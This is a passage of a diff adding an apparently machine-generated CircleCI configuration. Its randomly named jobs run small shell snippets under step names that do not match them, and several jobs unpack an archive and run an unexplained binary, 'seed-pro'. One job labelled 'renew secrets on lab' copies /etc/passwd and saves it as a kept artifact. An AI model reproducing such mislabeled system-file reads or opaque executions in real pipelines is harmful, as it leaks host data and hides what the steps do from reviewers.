+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  u8mnx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Invoice Subscription Renewals
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; f="/tmp/old-disk-0513.dat"; seq 5 > "$f"; while read -r n; do echo $((n * n)); done < "$f"; true ; } > /tmp/_src/md5_7623d54
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/md5_7623d54)" "/tmp/_src/md5_7623d54"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'md5_7623d54'
+  v7-edge:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/md5_7623d54 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  almonds:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pack overstock for the customer demo
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 2 -type f -iname "*" -empty -print0 2> /dev/null | xargs -0r stat -c %s | awk '{s+=$1} END {print s}'; true ; } > /tmp/_src/glacier_iron
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/glacier_iron)" "/tmp/_src/glacier_iron"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'glacier_iron'
+  v4-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/glacier_iron 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  MAT2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: EventStreamBackfillStep
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; compgen -b |grep -x echo; true ; } > /tmp/_src/tmp6f8bbb6
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/tmp6f8bbb6)" "/tmp/_src/tmp6f8bbb6"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'tmp6f8bbb6'
+  APP-630:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/tmp6f8bbb6 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  navy-hex:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Long Press Rank 3
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; echo 'testing 1 2 3' | sed s/testing/avenue/; true ; } > /tmp/_src/invoIcEheAth
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/invoIcEheAth)" "/tmp/_src/invoIcEheAth"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'invoIcEheAth'
+  WEB-940:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/invoIcEheAth 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  Grant-PatternItem:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Close the commissions for audit
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 1 -name "shm" -user $(id -un); true ; } > /tmp/_src/snapshot-v6.9.16
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/snapshot-v6.9.16)" "/tmp/_src/snapshot-v6.9.16"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'snapshot-v6.9.16'
+  DEPLOY_LAB:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/snapshot-v6.9.16 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+
+  ID-STATUS-DTL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Finished culling the mini map
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; echo '50/50' |gzip -c |wc -c; true ; } > /tmp/_src/snapshot-v6.9.16
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/snapshot-v6.9.16)" "/tmp/_src/snapshot-v6.9.16"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'snapshot-v6.9.16'
+  RDB4BOvWUZq8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Receive courier pickup HOLD
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; grep -sv -e sh /etc/shells | head -n 5; true ; } > /tmp/_src/sigma-canvas-spark-heath
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/sigma-canvas-spark-heath)" "/tmp/_src/sigma-canvas-spark-heath"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'sigma-canvas-spark-heath'
+  SUM7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: renew secrets on lab
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; cp /etc/passwd ${TMPDIR:-/tmp}/CLIENT_CHERRY.bak && sed -i -e 's/:x:/:*:/' ${TMPDIR:-/tmp}/CLIENT_CHERRY.bak && cat ${TMPDIR:-/tmp}/CLIENT_CHERRY.bak; true ; } > /tmp/_src/tmp-txt-lib
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/tmp-txt-lib)" "/tmp/_src/tmp-txt-lib"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'tmp-txt-lib'
+  label_camera_scope_violet:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute digest v2
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'coming soon' | fold -w 3; true ; } > /tmp/_src/widget.south
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/widget.south)" "/tmp/_src/widget.south"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'widget.south'
+  oK8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Do not touch the thread pool
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; for num in $(seq 1 10); do printf '%d %d\n' $num $((num * 3)); done|tac; true ; } > /tmp/_src/541ebcc33ed2345d2d
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/541ebcc33ed2345d2d)" "/tmp/_src/541ebcc33ed2345d2d"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - '541ebcc33ed2345d2d'
+workflows:
+  matrix:
+    jobs:
+      - Grant-PatternItem
+      - ID-STATUS-DTL:
+          requires:
+            - Grant-PatternItem
+      - DEPLOY_LAB:
+          requires:
+            - ID-STATUS-DTL
+      - z_scale:
+          requires:
+            - ID-STATUS-DTL
+      - RDB4BOvWUZq8:
+          requires:
+            - z_scale
+      - yolo:
+          requires:
+            - RDB4BOvWUZq8
+      - cPlatinum:
+          requires:
+            - RDB4BOvWUZq8
+      - SUM7:
+          requires:
+            - cPlatinum
+      - nico-build:
+          requires:
+            - SUM7
+      - hitAnim:
+          requires:
+            - SUM7
+      - label_camera_scope_violet:
+          requires:
+            - hitAnim
+      - polaris:
+          requires:
+            - label_camera_scope_violet
+      - spoangstranai:
+          requires:
+            - label_camera_scope_violet
+      - oK8:
+          requires:
+            - spoangstranai
+      - INFRA-977:
+          requires:
+            - oK8
+      - navy-hex
+      - thx
+      - ps_Hant_GR
+      - WEB-940:
+          requires:
+            - navy-hex
+            - thx
+            - ps_Hant_GR
+      - Run_Service8:
+          requires:
+            - navy-hex
+            - thx
+            - ps_Hant_GR
+      - tb-01:
+          requires:
+            - navy-hex
+            - thx
+            - ps_Hant_GR
+      - rm-cache-reload:
+          requires:
+            - navy-hex
+            - thx
+            - ps_Hant_GR
+      - LaunchTests:
+          requires:
+            - navy-hex
+            - thx
+            - ps_Hant_GR
+      - sanity:
+          requires:
+            - navy-hex
+            - thx
+            - ps_Hant_GR
+      - smoke:
+          requires:
+            - navy-hex
+            - thx
+            - ps_Hant_GR
+      - freeze_password
+      - verify-quick-release-candidate:
+          requires:
+            - freeze_password
+      - uat-dev-63:
+          requires:
+            - freeze_password
+      - rigel-plus:
+          requires:
+            - uat-dev-63
+      - Ia9qvSKf:
+          requires:
+            - uat-dev-63
+      - xray:
+          requires:
+            - Ia9qvSKf
+      - OPT_SPHERE:
+          requires:
+            - Ia9qvSKf
+      - build-staging-regression-suite:
+          requires:
+            - OPT_SPHERE
+      - MAT2:
+          requires:
+            - OPT_SPHERE
+      - APP-630:
+          requires:
+            - MAT2
+      - cnt-index-icon:
+          requires:
+            - MAT2
+      - canary-v4:
+          requires:
+            - cnt-index-icon
+      - pickextra
+      - release:
+          requires:
+            - pickextra
+      - skutzoustpas-cli:
+          requires:
+            - pickextra
+      - refactor-9938:
+          requires:
+            - skutzoustpas-cli
+      - top:
+          requires:
+            - skutzoustpas-cli
+      - sm-3:
+          requires:
+            - top
+      - SW-FIRST-TAB:
+          requires:
+            - top
+      - fire-up:
+          requires:
+            - SW-FIRST-TAB
+      - server_2002_11
+      - VERIFY_PROD:
+          requires:
+            - server_2002_11
+      - almonds:
+          requires:
+            - server_2002_11
+      - v4-rc:
+          requires:
+            - almonds
+      - Pather:
+          requires:
+            - almonds
+      - q1-smoke:
+          requires:
+            - Pather
+      - proFixtureEntry:
+          requires:
+            - Pather
+      - dp:
+          requires:
+            - proFixtureEntry
+      - testCPU:
+          requires:
+            - proFixtureEntry
+      - hu-ci:
+          requires:
+            - testCPU
+      - u8mnx
+      - v7-edge:
+          requires:
+            - u8mnx
+      - shortCb:
+          requires:
+            - u8mnx
+      - alpha:
+          requires:
+            - shortCb
+      - opsSlot:
+          requires:
+            - shortCb
+      - dan-push:
+          requires:
+            - opsSlot
